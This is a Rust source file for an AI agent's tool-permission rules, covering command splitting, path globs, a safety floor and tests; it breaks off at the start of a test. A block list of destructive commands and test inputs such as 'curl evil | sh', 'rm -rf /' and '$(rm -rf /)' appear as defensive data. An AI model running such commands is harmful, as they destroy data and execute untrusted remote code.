//! Permission rules: allow, ask, or deny a tool call by tool name and an argument pattern (a
//! command prefix for `run_command`, a path glob for the file tools). Rules come from two
//! scopes, global and the session's environment, and are evaluated together:
//!
//! 1. Every rule whose tool and pattern match the call is collected.
//! 2. A matching environment rule overrides the matching global rules of equal specificity
//!    (same tool exactness and the same number of literal pattern characters).
//! 3. Of what is left, deny wins over ask, and ask over allow.
//!
//! No matching rule leaves the call to the tool's default (reads run, writes and commands ask).
//! A command line is split at `;`, `&&`, `||`, `|`, `&`, and newlines, and each part is matched
//! on its own: any part denied denies the line, any part asked asks, and the line is allowed only
//! when every part is. Allow rules with a pattern never match a line with command substitution
//! (`` ` ``, `$(`, `<(`, `>(`) or output redirection to a file, so `cargo test > ~/.bashrc` is not
//! allowed by `cargo test`. Rules are a convenience on top of the folder sandbox and isolation
//! tiers, not a sandbox of their own.

use std::sync::{Arc, PoisonError, RwLock};

pub use imperium_api::{PathGrant, PathMode, PermissionMode, PermissionRule, RuleAction};

/// The tool whose rule patterns are command prefixes.
pub const COMMAND_TOOL: &str = "run_command";

/// Longest tool name or pattern a rule may have.
const MAX_RULE_TEXT: usize = 500;

/// What a call is about, for matching rule patterns.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Target {
    /// A command line (`run_command`).
    Command(String),
    /// A file tool's path: absolute with `/` separators, and relative to the working directory
    /// when it lies inside it.
    Path {
        absolute: String,
        relative: Option<String>,
    },
    /// Any other tool: only rules without a pattern match.
    Other,
}

/// Rules that may change while sessions run: sessions hold the handle, so a change (such as
/// "always allow" from an approval) applies from their next call.
#[derive(Debug, Clone, Default)]
pub struct SharedRules(Arc<RwLock<Vec<PermissionRule>>>);

impl SharedRules {
    pub fn new(rules: Vec<PermissionRule>) -> Self {
        SharedRules(Arc::new(RwLock::new(rules)))
    }

    pub fn get(&self) -> Vec<PermissionRule> {
        self.0
            .read()
            .unwrap_or_else(PoisonError::into_inner)
            .clone()
    }

    pub fn set(&self, rules: Vec<PermissionRule>) {
        *self.0.write().unwrap_or_else(PoisonError::into_inner) = rules;
    }
}

/// A session's permission mode, shared by its agents so a change applies from their next call.
#[derive(Debug, Clone, Default)]
pub struct SharedMode(Arc<RwLock<PermissionMode>>);

impl SharedMode {
    pub fn new(mode: PermissionMode) -> Self {
        SharedMode(Arc::new(RwLock::new(mode)))
    }

    pub fn get(&self) -> PermissionMode {
        *self.0.read().unwrap_or_else(PoisonError::into_inner)
    }

    pub fn set(&self, mode: PermissionMode) {
        *self.0.write().unwrap_or_else(PoisonError::into_inner) = mode;
    }
}

/// A session's rules: the global ones and its environment's, and its permission mode.
#[derive(Debug, Clone, Default)]
pub struct Permissions {
    pub global: SharedRules,
    pub environment: SharedRules,
    pub mode: SharedMode,
}

impl PartialEq for Permissions {
    fn eq(&self, other: &Self) -> bool {
        Arc::ptr_eq(&self.global.0, &other.global.0)
            && Arc::ptr_eq(&self.environment.0, &other.environment.0)
            && Arc::ptr_eq(&self.mode.0, &other.mode.0)
    }
}

impl Eq for Permissions {}

impl Permissions {
    pub fn new(global: SharedRules, environment: SharedRules) -> Self {
        Permissions {
            global,
            environment,
            mode: SharedMode::default(),
        }
    }

    /// The same rules, starting in `mode` (a handle of its own, not shared with `self`).
    pub fn with_mode(self, mode: PermissionMode) -> Self {
        Permissions {
            mode: SharedMode::new(mode),
            ..self
        }
    }

    /// What the rules say about a call to `tool` on `target`; `None` when no rule matches.
    pub fn evaluate(&self, tool: &str, target: &Target) -> Option<RuleAction> {
        evaluate(&self.global.get(), &self.environment.get(), tool, target)
    }

    /// Whether any rule could ask about or deny something, so callers can skip per-file checks
    /// without.
    pub fn has_ask_or_deny_rules(&self) -> bool {
        self.global
            .get()
            .iter()
            .chain(self.environment.get().iter())
            .any(|rule| rule.action != RuleAction::Allow)
    }

    /// The session's permission mode now.
    pub fn mode(&self) -> PermissionMode {
        self.mode.get()
    }

    /// Changes the session's permission mode from its agents' next calls on.
    pub fn set_mode(&self, mode: PermissionMode) {
        self.mode.set(mode);
    }
}

/// What a call does, for the permission mode.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CallKind {
    /// Reads, listings, searches: never changes anything.
    Read,
    /// Creates or changes files (`write_file`, `edit_file`).
    Edit,
    /// Runs a command.
    Execute,
    /// Another tool (MCP, web, browser, media, app config): `asks` is whether it asks by default.
    Other { asks: bool },
}

/// What happens to a call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// Runs without asking.
    Run,
    /// Asks the user. With `sticky`, a tool the user allowed for the session runs without
    /// asking again; without it (ask-every-time mode, the safety floor) it asks every time.
    Ask { sticky: bool },
    /// Refused without asking.
    Refuse(Refusal),
}

/// Why a call was refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Refusal {
    /// A deny rule matched.
    Rule,
    /// The session is in plan mode, which only reads.
    Plan,
}

/// How a call is decided from the session's mode, the matching rules' action (`rule`), and
/// whether the built-in safety floor covers it (`floor`, see [`safety_floor`]).
///
/// Deny rules win in every mode. Plan mode refuses edits, commands, and tools that would ask.
/// The safety floor asks (every time) in every other mode, whatever the allow rules say. Ask
/// rules ask every time in every mode, even for a tool allowed for the session; otherwise:
///
/// | Mode | Read | Edit | Execute | Other tools |
/// |---|---|---|---|---|
/// | `ask` | runs | asks every time | asks every time | ask every time if they ask by default |
/// | `default` | runs | allow rule or ask | allow rule or ask | allow rule, else their default |
/// | `accept_edits` | runs | runs | allow rule or ask | allow rule, else their default |
/// | `plan` | runs | refused | refused | refused if they would ask |
/// | `full` | runs | runs | runs | run |
pub fn decide_call(
    mode: PermissionMode,
    kind: CallKind,
    rule: Option<RuleAction>,
    floor: bool,
) -> Decision {
    if rule == Some(RuleAction::Deny) {
        return Decision::Refuse(Refusal::Rule);
    }
    let asks_by_default = match kind {
        CallKind::Read => false,
        CallKind::Edit | CallKind::Execute => true,
        CallKind::Other { asks } => asks,
    };
    // An ask rule asks every time: an "always this session" approval does not lift it.
    let ask_rule = rule == Some(RuleAction::Ask);
    if mode == PermissionMode::Plan {
        return if kind == CallKind::Read || !(asks_by_default || ask_rule) {
            if ask_rule {
                Decision::Ask { sticky: false }
            } else {
                Decision::Run
            }
        } else {
            Decision::Refuse(Refusal::Plan)
        };
    }
    if (floor && kind != CallKind::Read) || ask_rule {
        return Decision::Ask { sticky: false };
    }
    let allowed = rule == Some(RuleAction::Allow);
    let ask = match mode {
        PermissionMode::Ask => {
            return if asks_by_default {
                Decision::Ask { sticky: false }
            } else {
                Decision::Run
            };
        }
        PermissionMode::Full => false,
        PermissionMode::AcceptEdits if kind == CallKind::Edit => false,
        _ => asks_by_default && !allowed,
    };
    if ask {
        Decision::Ask { sticky: true }
    } else {
        Decision::Run
    }
}

/// Built-in ask rules for destructive commands. They ask in every mode but plan (which refuses
/// commands anyway), even when an allow rule, full access, or "always this session" would let
/// the command run. Like rules, they see only the command line, not what a script does.
const FLOOR_COMMANDS: &[&str] = &[
    "rm -r*",
    "rm -R*",
    "rm -f*",
    "rm --recursive*",
    "rm --force*",
    "rmdir /s*",
    "rmdir /S*",
    "rd /s*",
    "rd /S*",
    "del /s*",
    "del /S*",
    "del /q*",
    "del /Q*",
    "Remove-Item *",
    "format",
    "mkfs*",
    "dd",
    "diskpart",
    "shutdown",
    "reboot",
    "sudo",
    "su",
    "git push --force*",
    "git push -f",
    "git push --delete*",
    "git reset --hard*",
    "git clean*",
    "git branch -D*",
    "git checkout -- *",
    "git checkout .",
    "git restore *",
    "git stash drop*",
    "git stash clear",
];

/// Built-in ask rules for writing files that hold secrets or git's own records.
const FLOOR_PATHS: &[&str] = &[
    ".env",
    ".env.*",
    "*.pem",
    "*.key",
    "id_rsa*",
    "id_ed25519*",
    "id_ecdsa*",
    ".npmrc",
    ".pypirc",
    ".netrc",
    "**/.git/**",
    ".git",
];

/// Whether the built-in safety floor covers a call: a destructive command, or writing a file
/// that holds secrets or git's records. Reads are never covered.
pub fn safety_floor(kind: CallKind, target: &Target) -> bool {
    let rules = |patterns: &[&str], tool: &str| -> Vec<PermissionRule> {
        patterns
            .iter()
            .map(|pattern| PermissionRule {
                tool: tool.into(),
                pattern: (*pattern).into(),
                action: RuleAction::Ask,
            })
            .collect()
    };
    match (kind, target) {
        (CallKind::Execute, Target::Command(_)) => {
            evaluate(
                &rules(FLOOR_COMMANDS, COMMAND_TOOL),
                &[],
                COMMAND_TOOL,
                target,
            ) == Some(RuleAction::Ask)
        }
        (CallKind::Edit, Target::Path { .. }) => {
            evaluate(&rules(FLOOR_PATHS, "*"), &[], "write_file", target) == Some(RuleAction::Ask)
        }
        _ => false,
    }
}

/// What `global` and `environment` rules say about a call to `tool` on `target`.
pub fn evaluate(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    tool: &str,
    target: &Target,
) -> Option<RuleAction> {
    match target {
        Target::Command(line) => evaluate_command(global, environment, tool, line),
        _ => decide(global, environment, |rule| rule_matches(rule, tool, target)),
    }
}

/// The strongest action among the matching rules, after environment rules override global
/// rules of equal specificity.
fn decide(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    matches: impl Fn(&PermissionRule) -> bool,
) -> Option<RuleAction> {
    let local: Vec<&PermissionRule> = environment.iter().filter(|rule| matches(rule)).collect();
    let overridden = |rule: &PermissionRule| {
        local
            .iter()
            .any(|own| specificity(own) == specificity(rule))
    };
    local
        .iter()
        .copied()
        .chain(
            global
                .iter()
                .filter(|rule| matches(rule) && !overridden(rule)),
        )
        .map(|rule| rule.action)
        .max()
}

/// How specific a rule is: an exact tool name beats a wildcard, then more literal pattern
/// characters beat fewer.
fn specificity(rule: &PermissionRule) -> (bool, usize) {
    let pattern = rule.pattern.trim();
    (
        !rule.tool.contains('*'),
        pattern.chars().filter(|c| !matches!(c, '*' | '?')).count(),
    )
}

fn patternless(rule: &PermissionRule) -> bool {
    matches!(rule.pattern.trim(), "" | "*" | "**")
}

fn tool_matches(rule: &PermissionRule, tool: &str) -> bool {
    let wanted = rule.tool.trim();
    wanted == "*" || glob(wanted, tool, false)
}

fn rule_matches(rule: &PermissionRule, tool: &str, target: &Target) -> bool {
    if !tool_matches(rule, tool) {
        return false;
    }
    if patternless(rule) {
        return true;
    }
    match target {
        Target::Path { absolute, relative } => {
            path_matches(&rule.pattern, absolute, relative.as_deref())
        }
        Target::Command(line) => prefix_matches(&rule.pattern, &command_words(line)),
        Target::Other => false,
    }
}

fn evaluate_command(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    tool: &str,
    line: &str,
) -> Option<RuleAction> {
    let risky = risky(line);
    let pieces = split_command(line);
    if pieces.is_empty() {
        return decide(global, environment, |rule| {
            tool_matches(rule, tool) && patternless(rule)
        });
    }
    let mut decisions = Vec::with_capacity(pieces.len());
    for piece in &pieces {
        let words = command_words(piece);
        decisions.push(decide(global, environment, |rule| {
            if !tool_matches(rule, tool) {
                return false;
            }
            if patternless(rule) {
                return true;
            }
            if risky && rule.action == RuleAction::Allow {
                return false;
            }
            prefix_matches(&rule.pattern, &words)
        }));
    }
    if decisions.contains(&Some(RuleAction::Deny)) {
        Some(RuleAction::Deny)
    } else if decisions.contains(&Some(RuleAction::Ask)) {
        Some(RuleAction::Ask)
    } else if decisions.iter().all(|d| *d == Some(RuleAction::Allow)) {
        Some(RuleAction::Allow)
    } else {
        None
    }
}

/// Redirections that only merge or discard output, removed before a line is split.
const HARMLESS_REDIRECTS: &[&str] = &[
    "2>&1",
    "1>&2",
    ">&2",
    ">&1",
    "2>/dev/null",
    ">/dev/null",
    "2> /dev/null",
    "> /dev/null",
    "2>nul",
    ">nul",
    "2>NUL",
    ">NUL",
];

fn without_harmless_redirects(line: &str) -> String {
    let mut line = line.to_string();
    for redirect in HARMLESS_REDIRECTS {
        line = line.replace(redirect, " ");
    }
    line
}

/// Whether the line substitutes commands or redirects output into a file.
fn risky(line: &str) -> bool {
    let line = without_harmless_redirects(line);
    ["`", "$(", "<(", ">("].iter().any(|s| line.contains(s)) || line.contains('>')
}

/// The line's commands, split at `;`, `&&`, `||`, `|`, `&`, and newlines. Quotes are not
/// parsed: a separator inside quotes still splits, which only makes rules stricter.
fn split_command(line: &str) -> Vec<String> {
    without_harmless_redirects(line)
        .split([';', '&', '|', '\n', '\r'])
        .map(str::trim)
        .filter(|piece| !piece.is_empty())
        .map(str::to_string)
        .collect()
}

/// A command's words, without leading `NAME=value` assignments; the program is reduced to its
/// file name without `.exe`, `.cmd`, or `.bat` (and lower-cased on Windows), so `/bin/rm` and
/// `RM.EXE` are `rm` there.
fn command_words(command: &str) -> Vec<String> {
    let mut words: Vec<String> = command
        .split_whitespace()
        .skip_while(|word| is_assignment(word))
        .map(str::to_string)
        .collect();
    if let Some(first) = words.first_mut() {
        *first = program_name(first);
    }
    words
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

fn program_name(word: &str) -> String {
    let word = word.trim_matches(|c| c == '"' || c == '\'');
    let name = word.rsplit(['/', '\\']).next().unwrap_or(word);
    let lower = name.to_ascii_lowercase();
    let name = [".exe", ".cmd", ".bat"]
        .iter()
        .find(|suffix| lower.ends_with(*suffix))
        .map_or(name, |suffix| &name[..name.len() - suffix.len()]);
    if cfg!(windows) {
        name.to_ascii_lowercase()
    } else {
        name.to_string()
    }
}

/// Whether `pattern`'s words start `words`. A pattern word may use `*` and `?`; a final `*`
/// word matches the rest of the line, including nothing.
fn prefix_matches(pattern: &str, words: &[String]) -> bool {
    let wanted = command_words(pattern);
    let wanted = match wanted.split_last() {
        Some((last, rest)) if last == "*" => rest,
        _ => wanted.as_slice(),
    };
    if wanted.len() > words.len() {
        return false;
    }
    wanted
        .iter()
        .zip(words)
        .all(|(want, word)| glob(want, word, false))
}

/// The home folder, for `~` in grants and patterns.
pub fn home_dir() -> Option<String> {
    ["HOME", "USERPROFILE"]
        .iter()
        .filter_map(|name| std::env::var(name).ok())
        .find(|home| !home.trim().is_empty())
}

/// `path` with a leading `~` replaced by the home folder.
pub fn expand_home(path: &str) -> String {
    let path = path.trim();
    let rest = match path.strip_prefix('~') {
        Some(rest) if rest.is_empty() || rest.starts_with(['/', '\\']) => rest,
        _ => return path.to_string(),
    };
    match home_dir() {
        Some(home) => format!("{}{rest}", home.trim_end_matches(['/', '\\'])),
        None => path.to_string(),
    }
}

fn is_absolute_pattern(pattern: &str) -> bool {
    let bytes = pattern.as_bytes();
    pattern.starts_with('/')
        || (bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':')
}

/// Whether a path glob matches a file tool's path. A pattern without `/` matches the file name
/// at any depth (`.env`, `*.pem`); an absolute pattern (or one starting with `~`) matches the
/// absolute path; any other pattern matches the path relative to the working directory. `*` and
/// `?` stay within one path segment, `**` crosses segments, and `dir/**` also matches `dir`.
/// Matching ignores case on Windows.
fn path_matches(pattern: &str, absolute: &str, relative: Option<&str>) -> bool {
    let pattern = expand_home(pattern).replace('\\', "/");
    let pattern = pattern.trim().trim_start_matches("./");
    let fold = cfg!(windows);
    let try_match = |text: &str| {
        glob(pattern, text, fold)
            || pattern
                .strip_suffix("/**")
                .is_some_and(|dir| glob(dir, text, fold))
    };
    if !pattern.contains('/') {
        let name = absolute.rsplit('/').next().unwrap_or(absolute);
        return try_match(name);
    }
    if is_absolute_pattern(pattern) {
        return try_match(absolute);
    }
    relative.is_some_and(try_match)
}

/// Glob matching: `**` matches anything, `*` anything but `/`, `?` one character but `/`.
pub(crate) fn glob(pattern: &str, text: &str, fold: bool) -> bool {
    let normalize = |s: &str| -> Vec<char> {
        if fold {
            s.chars().flat_map(char::to_lowercase).collect()
        } else {
            s.chars().collect()
        }
    };
    let pattern = normalize(pattern);
    let text = normalize(text);
    // matches[i][j]: pattern[i..] matches text[j..].
    let (p, t) = (pattern.len(), text.len());
    let mut matches = vec![vec![false; t + 1]; p + 1];
    matches[p][t] = true;
    for i in (0..p).rev() {
        let double = pattern[i] == '*' && pattern.get(i + 1) == Some(&'*');
        for j in (0..=t).rev() {
            matches[i][j] = match pattern[i] {
                '*' if double => {
                    // `**` (and a following `/`, so `a/**/b` matches `a/b`) matches any run.
                    let next = if pattern.get(i + 2) == Some(&'/') {
                        i + 3
                    } else {
                        i + 2
                    };
                    matches[i + 2][j]
                        || (next != i + 2 && matches[next][j])
                        || (j < t && matches[i][j + 1])
                }
                '*' => {
                    // The second star of a `**` is handled by the first.
                    if i > 0 && pattern[i - 1] == '*' {
                        matches[i + 1][j]
                    } else {
                        matches[i + 1][j] || (j < t && text[j] != '/' && matches[i][j + 1])
                    }
                }
                '?' => j < t && text[j] != '/' && matches[i + 1][j + 1],
                c => j < t && text[j] == c && matches[i + 1][j + 1],
            };
        }
    }
    matches[0][0]
}

/// The rule "always allow" would add for a call: the program and its subcommand for a simple
/// command line (none for a line with several commands, substitution, or redirection), the
/// file's folder for a file tool, and the whole tool otherwise.
pub fn suggest(tool: &str, target: &Target) -> Option<PermissionRule> {
    let pattern = match target {
        Target::Command(line) => {
            if risky(line) || split_command(line).len() != 1 {
                return None;
            }
            let words = command_words(line);
            let first = words.first()?;
            let mut pattern = first.clone();
            if let Some(second) = words.get(1)
                && second.len() <= 30
                && second
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == ':')
                && !second.starts_with('-')
            {
                pattern.push(' ');
                pattern.push_str(second);
            }
            pattern
        }
        Target::Path { absolute, .. } => {
            let folder = absolute.rsplit_once('/').map_or("", |(folder, _)| folder);
            if folder.is_empty() {
                return None;
            }
            format!("{folder}/**")
        }
        Target::Other => String::new(),
    };
    Some(PermissionRule {
        tool: tool.to_string(),
        pattern,
        action: RuleAction::Allow,
    })
}

/// Checks a rule before it is saved.
pub fn validate_rule(rule: &PermissionRule) -> Result<(), String> {
    let tool = rule.tool.trim();
    if tool.is_empty() {
        return Err("a rule needs a tool name (or * for every tool)".into());
    }
    if tool.chars().any(char::is_whitespace) {
        return Err(format!("{tool:?} is not a tool name"));
    }
    if tool.len() > MAX_RULE_TEXT || rule.pattern.len() > MAX_RULE_TEXT {
        return Err(format!(
            "a rule's tool and pattern are at most {MAX_RULE_TEXT} characters"
        ));
    }
    Ok(())
}

/// Checks a path grant before it is saved: an absolute path, or one starting with `~`.
pub fn validate_grant(grant: &PathGrant) -> Result<(), String> {
    let path = grant.path.trim();
    if path.is_empty() {
        return Err("a path grant needs a path".into());
    }
    let absolute = path == "~"
        || path.starts_with("~/")
        || path.starts_with("~\\")
        || path.starts_with('/')
        || path.starts_with("\\\\")
        || is_absolute_pattern(&path.replace('\\', "/"));
    if !absolute {
        return Err(format!(
            "{path} is not an absolute path (or one starting with ~)"
        ));
    }
    if path.contains(['*', '?']) {
        return Err(format!("{path}: a grant is a path, not a pattern"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const ASK: Decision = Decision::Ask { sticky: true };
    const ASK_EVERY_TIME: Decision = Decision::Ask { sticky: false };
    const RUN: Decision = Decision::Run;

    #[test]
    fn each_mode_decides_reads_edits_and_commands() {
        use CallKind::{Edit, Execute, Read};
        use PermissionMode::*;
        let table = [
            // mode, read, edit, execute, other that asks, other that does not
            (
                Ask,
                RUN,
                ASK_EVERY_TIME,
                ASK_EVERY_TIME,
                ASK_EVERY_TIME,
                RUN,
            ),
            (Default, RUN, ASK, ASK, ASK, RUN),
            (AcceptEdits, RUN, RUN, ASK, ASK, RUN),
            (
                Plan,
                RUN,
                Decision::Refuse(Refusal::Plan),
                Decision::Refuse(Refusal::Plan),
                Decision::Refuse(Refusal::Plan),
                RUN,
            ),
            (Full, RUN, RUN, RUN, RUN, RUN),
        ];
        for (mode, read, edit, execute, asks, quiet) in table {
            assert_eq!(decide_call(mode, Read, None, false), read, "{mode} read");
            assert_eq!(decide_call(mode, Edit, None, false), edit, "{mode} edit");
            assert_eq!(
                decide_call(mode, Execute, None, false),
                execute,
                "{mode} execute"
            );
            assert_eq!(
                decide_call(mode, CallKind::Other { asks: true }, None, false),
                asks,
                "{mode} other"
            );
            assert_eq!(
                decide_call(mode, CallKind::Other { asks: false }, None, false),
                quiet,
                "{mode} quiet other"
            );
        }
    }

    #[test]
    fn allow_rules_count_except_in_ask_and_plan_modes() {
        use PermissionMode::*;
        let allow = Some(RuleAction::Allow);
        assert_eq!(decide_call(Default, CallKind::Execute, allow, false), RUN);
        assert_eq!(
            decide_call(AcceptEdits, CallKind::Execute, allow, false),
            RUN
        );
        assert_eq!(
            decide_call(Ask, CallKind::Execute, allow, false),
            ASK_EVERY_TIME
        );
        assert_eq!(
            decide_call(Ask, CallKind::Edit, allow, false),
            ASK_EVERY_TIME
        );
        assert_eq!(
            decide_call(Plan, CallKind::Execute, allow, false),
            Decision::Refuse(Refusal::Plan)
        );
        assert_eq!(
            decide_call(Plan, CallKind::Edit, allow, false),
            Decision::Refuse(Refusal::Plan)
        );
        // Ask rules ask every time in every mode, full access included: a session's "always"
        // approval does not lift them.
        let ask = Some(RuleAction::Ask);
        for mode in PermissionMode::ALL {
            assert_eq!(
                decide_call(mode, CallKind::Read, ask, false),
                ASK_EVERY_TIME,
                "{mode}"
            );
            if mode != Plan {
                assert_eq!(
                    decide_call(mode, CallKind::Execute, ask, false),
                    ASK_EVERY_TIME,
                    "{mode}"
                );
            }
        }
        assert_eq!(
            decide_call(Ask, CallKind::Execute, ask, false),
            ASK_EVERY_TIME
        );
    }

    #[test]
    fn deny_rules_and_the_safety_floor_win_in_every_mode() {
        for mode in PermissionMode::ALL {
            for kind in [
                CallKind::Read,
                CallKind::Edit,
                CallKind::Execute,
                CallKind::Other { asks: false },
            ] {
                assert_eq!(
                    decide_call(mode, kind, Some(RuleAction::Deny), false),
                    Decision::Refuse(Refusal::Rule),
                    "{mode} {kind:?}"
                );
            }
            let floored = decide_call(mode, CallKind::Execute, Some(RuleAction::Allow), true);
            if mode == PermissionMode::Plan {
                assert_eq!(floored, Decision::Refuse(Refusal::Plan));
            } else {
                assert_eq!(floored, ASK_EVERY_TIME, "{mode}");
            }
        }
    }

    #[test]
    fn the_safety_floor_covers_destructive_commands_and_secret_files() {
        let floor = |line: &str| safety_floor(CallKind::Execute, &command(line));
        assert!(floor("rm -rf build"));
        assert!(floor("cargo test && rm -fr /"));
        assert!(floor("git push --force origin main"));
        assert!(floor("git reset --hard HEAD~1"));
        assert!(floor("sudo apt install x"));
        assert!(!floor("cargo test"));
        assert!(!floor("git push origin main"));
        assert!(!floor("rm notes.txt"));
        let path = |relative: &str| Target::Path {
            absolute: format!("/p/{relative}"),
            relative: Some(relative.into()),
        };
        assert!(safety_floor(CallKind::Edit, &path(".env")));
        assert!(safety_floor(CallKind::Edit, &path("config/.env.local")));
        assert!(safety_floor(CallKind::Edit, &path(".git/config")));
        assert!(safety_floor(CallKind::Edit, &path("certs/server.pem")));
        assert!(!safety_floor(CallKind::Edit, &path("src/main.rs")));
        assert!(!safety_floor(CallKind::Read, &path(".env")));
    }

    #[test]
    fn the_mode_is_shared_by_clones() {
        let permissions = Permissions::default().with_mode(PermissionMode::Plan);
        let copy = permissions.clone();
        copy.set_mode(PermissionMode::Full);
        assert_eq!(permissions.mode(), PermissionMode::Full);
        assert_eq!(Permissions::default().mode(), PermissionMode::Default);
    }

    fn rule(tool: &str, pattern: &str, action: RuleAction) -> PermissionRule {
        PermissionRule {
            tool: tool.into(),
            pattern: pattern.into(),
            action,
        }
    }

    fn command(line: &str) -> Target {
        Target::Command(line.into())
    }

    fn path(absolute: &str, relative: Option<&str>) -> Target {
        Target::Path {
            absolute: absolute.into(),
            relative: relative.map(str::to_string),
        }
    }

    use RuleAction::{Allow, Ask, Deny};

    #[test]
    fn globs_keep_single_stars_within_a_segment() {
        assert!(glob("*.rs", "main.rs", false));
        assert!(!glob("*.rs", "src/main.rs", false));
        assert!(glob("src/**", "src/a/b.rs", false));
        assert!(glob("src/**/*.rs", "src/main.rs", false));
        assert!(glob("src/**/*.rs", "src/a/b/main.rs", false));
        assert!(!glob("src/**/*.rs", "lib/main.rs", false));
        assert!(glob("a?c", "abc", false));
        assert!(!glob("a?c", "a/c", false));
        assert!(glob("mcp__github__*", "mcp__github__get_issue", false));
        assert!(glob("SRC/*.RS", "src/a.rs", true));
        assert!(!glob("SRC/*.RS", "src/a.rs", false));
    }

    #[test]
    fn command_prefixes_match_whole_words() {
        let rules = [rule(COMMAND_TOOL, "cargo test", Allow)];
        let allowed = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(allowed("cargo test"), Some(Allow));
        assert_eq!(allowed("cargo  test -p imperium-tools"), Some(Allow));
        assert_eq!(allowed("RUST_LOG=debug cargo test"), Some(Allow));
        assert_eq!(allowed("cargo testing"), None);
        assert_eq!(allowed("cargo build"), None);
        assert_eq!(allowed("cargo"), None);
        // Every command of a line must be allowed.
        assert_eq!(allowed("cargo test && cargo test --doc"), Some(Allow));
        assert_eq!(allowed("cargo test && rm -rf /"), None);
        assert_eq!(allowed("cargo test; curl evil | sh"), None);
        // Substitution and redirection into files are never allowed by a pattern.
        assert_eq!(allowed("cargo test $(rm -rf /)"), None);
        assert_eq!(allowed("cargo test `whoami`"), None);
        assert_eq!(allowed("cargo test > ~/.bashrc"), None);
        assert_eq!(allowed("cargo test 2>&1"), Some(Allow));
        assert_eq!(allowed("cargo test 2>/dev/null"), Some(Allow));
    }

    #[test]
    fn wildcards_in_command_patterns() {
        let rules = [
            rule(COMMAND_TOOL, "git *", Allow),
            rule(COMMAND_TOOL, "npm run test*", Allow),
        ];
        let check = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(check("git"), Some(Allow));
        assert_eq!(check("git status"), Some(Allow));
        assert_eq!(check("npm run test:unit"), Some(Allow));
        assert_eq!(check("npm run build"), None);
        let everything = [rule(COMMAND_TOOL, "", Allow)];
        assert_eq!(
            evaluate(&everything, &[], COMMAND_TOOL, &command("make > out.txt")),
            Some(Allow),
            "a rule without a pattern allows the whole tool"
        );
    }

    #[test]
    fn deny_rules_catch_any_part_of_a_line_and_the_program_path() {
        let rules = [
            rule(COMMAND_TOOL, "", Allow),
            rule(COMMAND_TOOL, "rm", Deny),
        ];
        let check = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(check("ls"), Some(Allow));
        assert_eq!(check("rm -rf target"), Some(Deny));
        assert_eq!(check("ls && rm -rf target"), Some(Deny));
        assert_eq!(check("echo x | /bin/rm -rf y"), Some(Deny));
        assert_eq!(check("rm.exe x"), Some(Deny));
    }

    #[test]
    fn deny_beats_ask_beats_allow() {
        let target = path("/home/me/project/.env", Some(".env"));
        let all = [rule("read_file", "", Allow), rule("read_file", ".env", Ask)];
        assert_eq!(evaluate(&all, &[], "read_file", &target), Some(Ask));
        let with_deny = [
            rule("read_file", "", Allow),
            rule("read_file", ".env", Ask),
            rule("*", "**/.env", Deny),
        ];
        assert_eq!(evaluate(&with_deny, &[], "read_file", &target), Some(Deny));
        // A specific allow does not lift a broader deny.
        let broad_deny = [
            rule(COMMAND_TOOL, "", Deny),
            rule(COMMAND_TOOL, "ls", Allow),
        ];
        assert_eq!(
            evaluate(&broad_deny, &[], COMMAND_TOOL, &command("ls")),
            Some(Deny)
        );
        assert_eq!(evaluate(&[], &[], "read_file", &target), None);
    }

    #[test]
    fn environment_rules_override_global_rules_of_equal_specificity() {
        let global = [rule(COMMAND_TOOL, "cargo publish", Deny)];
        let environment = [rule(COMMAND_TOOL, "cargo publish", Allow)];
        let line = command("cargo publish --dry-run");
        assert_eq!(evaluate(&global, &[], COMMAND_TOOL, &line), Some(Deny));
        assert_eq!(
            evaluate(&global, &environment, COMMAND_TOOL, &line),
            Some(Allow)
        );
        // A less specific environment rule does not override a more specific global one.
        let broad = [rule(COMMAND_TOOL, "cargo", Allow)];
        assert_eq!(evaluate(&global, &broad, COMMAND_TOOL, &line), Some(Deny));
        // Nor does it the other way round: a global deny of the whole tool still wins.
        let global_all = [rule(COMMAND_TOOL, "", Deny)];
        assert_eq!(
            evaluate(&global_all, &environment, COMMAND_TOOL, &line),
            Some(Deny)
        );
        // An environment deny overrides a global allow of equal specificity, too.
        let allow_global = [rule("write_file", "", Allow)];
        let deny_env = [rule("write_file", "*", Deny)];
        assert_eq!(
            evaluate(
                &allow_global,
                &deny_env,
                "write_file",
                &path("/p/a", Some("a"))
            ),
            Some(Deny)
        );
    }

    #[test]
    fn path_patterns_match_names_relative_and_absolute_paths() {
        let target = path("/home/me/project/src/main.rs", Some("src/main.rs"));
        let check = |pattern: &str| {
            evaluate(
                &[rule("write_file", pattern, Deny)],
                &[],
                "write_file",
                &target,
            )
        };
        assert_eq!(check("*.rs"), Some(Deny));
        assert_eq!(check("main.rs"), Some(Deny));
        assert_eq!(check("src/**"), Some(Deny));
        assert_eq!(check("./src/*.rs"), Some(Deny));
        assert_eq!(check("/home/me/project/**"), Some(Deny));
        assert_eq!(check("/home/me/other/**"), None);
        assert_eq!(check("lib/**"), None);
        assert_eq!(check("*.toml"), None);
        // A folder pattern also matches the folder itself.
        let folder = path("/home/me/project/src", Some("src"));
        assert_eq!(
            evaluate(
                &[rule("list_dir", "src/**", Allow)],
                &[],
                "list_dir",
                &folder
            ),
            Some(Allow)
        );
        // Other tools match only rules without a pattern.
        assert_eq!(
            evaluate(
                &[rule("web_fetch", "x", Allow)],
                &[],
                "web_fetch",
                &Target::Other
            ),
            None
        );
        assert_eq!(
            evaluate(
                &[rule("mcp__github__*", "", Allow)],
                &[],
                "mcp__github__get_issue",
                &Target::Other
            ),
            Some(Allow)
        );
    }

    #[test]
    fn suggestions_name_the_command_or_folder() {
